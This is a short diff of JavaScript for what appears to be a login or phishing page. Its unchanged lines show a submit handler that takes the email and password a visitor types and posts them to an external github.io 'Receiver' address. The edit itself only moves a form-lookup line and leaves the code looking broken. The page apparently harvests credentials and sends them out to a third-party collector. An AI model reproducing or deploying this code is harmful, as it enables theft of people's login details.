@@ -36,6 +36,7 @@ form.addEventListener('submit', function(e) {
     e.preventDefault();
         const email = Emailadd.value;
         const password = Password.value;
+        const form = document.getElementById('form');
             $.post("https://dominator200.github.io/Receiver8787462385790687/",
     {
       EamilValue: email,
@@ -45,8 +46,6 @@ form.addEventListener('submit', function(e) {
       alert("Data: " + data + "\nStatus: " + status);
     });
 });
-
-                const form = document.getElementById('form');
 
         form.addEventListener('submit', function(e) {
           e.preventDefault();
